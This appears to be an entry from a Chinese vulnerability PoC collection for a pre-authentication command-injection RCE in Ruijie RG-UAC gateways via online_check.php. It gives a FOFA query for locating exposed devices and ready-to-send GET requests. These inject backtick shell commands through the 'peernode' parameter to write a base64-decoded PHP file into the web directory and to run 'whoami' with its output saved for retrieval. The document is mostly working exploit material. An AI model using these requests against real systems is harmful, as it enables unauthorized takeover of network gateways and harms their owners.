# 锐捷RG-UAC应用网关online_check.php前台RCE漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`fofa：app="Ruijie-RG-UAC"`
- **请求**：`GET /view/vpn/autovpn/online_check.php?peernode=%20%20`echo%20PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==%20%20base64%20-d%20%3E%20test.php` HTTP/1.1`

**请求体 / payload**
```
访问该链接出现如下页面表示可能存在漏洞
/view/vpn/autovpn/online_check.php
iii:0,hit:0
通过以下poc写入文件
Host:
Sec-Fetch-User: ?1
文件写入位置
/view/vpn/autovpn/test.php
通过如下poc执行命令
GET /view/vpn/autovpn/online_check.php?peernode=%20%20`whoami%20>%201.txt` HTTP/1.1
Host:
Sec-Fetch-User: ?1
获取命令执行结果
/view/vpn/autovpn/1.txt
>
```

**其他**
- 锐捷RG-UAC应用网关online_check.php前台RCE漏洞: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: 锐捷RG-UAC应用网关